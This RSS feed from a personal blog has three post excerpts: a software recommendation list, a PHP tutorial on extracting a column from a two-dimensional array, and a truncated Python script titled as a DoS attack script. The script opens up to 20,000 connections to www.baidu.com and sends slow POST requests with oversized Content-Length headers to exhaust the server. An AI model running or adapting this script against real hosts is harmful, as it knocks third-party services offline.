<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on My Site</title>
    <link>https://h-zeus.github.io/posts/</link>
    <description>Recent content in Posts on My Site</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 08 Apr 2020 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="https://h-zeus.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Dos 攻击脚本</title>
      <link>https://h-zeus.github.io/posts/dos-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/</link>
      <pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/dos-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC/</guid>
      <description>#!/usr/bin/env python import socket import time import threading # Pressure Test,ddos tool # --------------------------- MAX_CONN = 20000 PORT = 80 HOST = &amp;#34;www.baidu.com&amp;#34; PAGE = &amp;#34;/index.php&amp;#34; # --------------------------- buf = (&amp;#34;POST %sHTTP/1.1\r\n&amp;#34; &amp;#34;Host: %s\r\n&amp;#34; &amp;#34;Content-Length: 10000000\r\n&amp;#34; &amp;#34;Cookie: dklkt_dos_test\r\n&amp;#34; &amp;#34;\r\n&amp;#34; % (PAGE, HOST)) socks = [] def conn_thread(): global socks for i in range(0, MAX_CONN): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((HOST, PORT)) s.send(buf.encode()) print(&amp;#34;Send buf OK!,conn=%d\n&amp;#34; % i) socks.append(s) except Exception as ex: print(&amp;#34;Could not connect to server or send error:%s&amp;#34; % ex) time.</description>
    </item>
    
    <item>
      <title>Mac/Windows Soft</title>
      <link>https://h-zeus.github.io/posts/%E8%BD%AF%E4%BB%B6%E6%8E%A8%E8%8D%90/</link>
      <pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/%E8%BD%AF%E4%BB%B6%E6%8E%A8%E8%8D%90/</guid>
      <description>其他  Enpass 密码管理工具 Joplin 笔记软件（搭配坚果云可实现同步功能） 网易云音乐 音乐 WPS Office 办公套件 自动切换输入法 如名 pap.er 壁纸软件 超级右键 还原 Windows 右键菜单 Alfred 4 必备软件 自动化操作 eZip 解压缩软件 iCHM .CHM 查看器 BetterTouchTool 自动化操作 Google Chrome 谷歌浏览器（选择性安装）  编程  Postman 接口测试工具 Navicat Premium 多版本数据库 Hyper 自定义终端 Sublime Text 编辑器（代替文本编辑器） PhpStorm PHP 编辑器 PyCharm Python 编辑器 Xcode 编译编辑器 网易有道词典 翻译软件 VirtualBox 虚拟机（建议安装 Vagrant配合 .box使用） Typora MarkDown编辑器 Charles 抓包工具 MAMP 开发环境集成 SwitchHosts 管理 Hosts diffmerge 文件差异对比  Windows  Camtasia 9 视频剪辑、录屏软件 Fiddler 抓包工具 Adobe Audition 音频编辑软件 冰点文库 各大文库下载 FSCapture 截屏软件  </description>
    </item>
    
    <item>
      <title>PHP获取二维数组中某一列的值集合</title>
      <link>https://h-zeus.github.io/posts/php%E8%8E%B7%E5%8F%96%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%90%E4%B8%80%E5%88%97%E7%9A%84%E5%80%BC%E9%9B%86%E5%90%88/</link>
      <pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://h-zeus.github.io/posts/php%E8%8E%B7%E5%8F%96%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E6%9F%90%E4%B8%80%E5%88%97%E7%9A%84%E5%80%BC%E9%9B%86%E5%90%88/</guid>
      <description>PHP还是比较常用的，于是我研究了一下PHP二维数组。在处理php数组的时候，有一种需求特别的频繁，如下二维数组：
$arr = array( 1=&amp;gt;array( &amp;#39;id&amp;#39; =&amp;gt; 5, &amp;#39;name&amp;#39; =&amp;gt; &amp;#39;张三&amp;#39; ), 2=&amp;gt;array( &amp;#39;id&amp;#39; =&amp;gt; 6, &amp;#39;name&amp;#39; =&amp;gt; &amp;#39;李四&amp;#39; ) ); 目的就是要取到key为name的集合，得到这个结果：
$arr2 = array( 0=&amp;gt;&amp;#39;张三&amp;#39;, 1=&amp;gt;&amp;#39;李四&amp;#39; ); 这里有几种方法： 1：最简单的，foreach遍历数组：
foreach ($arr as $key =&amp;gt; $value) { $arr2[] = $value[&amp;#39;name&amp;#39;]; } 2：代码量稍微少一点的代码，使用了 array_map 这个php方法：
$arr2 = array_map(&amp;#39;array_shift&amp;#39;,$arr); 意为把$arr数组的每一项值的开头的值移出，并返回被移出的每一项值中被移出的值，注意此时新数组$arr2的键仍是原数组$arr的键
2.1：在方法2的基础上，可以稍微开一下脑洞，如果需要获取的是二维数组的每一项的开头列或结尾列，也可以这样做：
$arr2 = array_map(&amp;#39;reset&amp;#39;,$arr); $arr2 = array_map(&amp;#39;end&amp;#39;,$arr); 3：还可以使用 array_reduce 方法，不过代码略多，不过这个方法的想象空间（针对别的数组取值操作）还是蛮大的：
$arr2 = array_reduce($arr, create_function(&amp;#39;$result, $v&amp;#39;, &amp;#39;$result[] = $v[&amp;#34;name&amp;#34;];return $result;&amp;#39;)); array_reduce方法用回调函数迭代地将对数组的值进行操作，而create_function用于一个匿名方法做回调用，这个匿名方法的参数$result为上一次迭代产生的值，$v是当前的值，内部实现既为获取到数组$arr每一项的”name”的值并push到新$result数组;
4：最后这个终极方法实在是太爽了，一个方法就搞定，而且非常灵活：
$arr2 = array_column($arr, &amp;#39;name&amp;#39;); 第二个参数为想要获取的那一列的键名，是不是很方便呢，不过这个方法有个限制，就是php版本必须 &amp;gt;= 5.</description>
    </item>
    
  </channel>
</rss>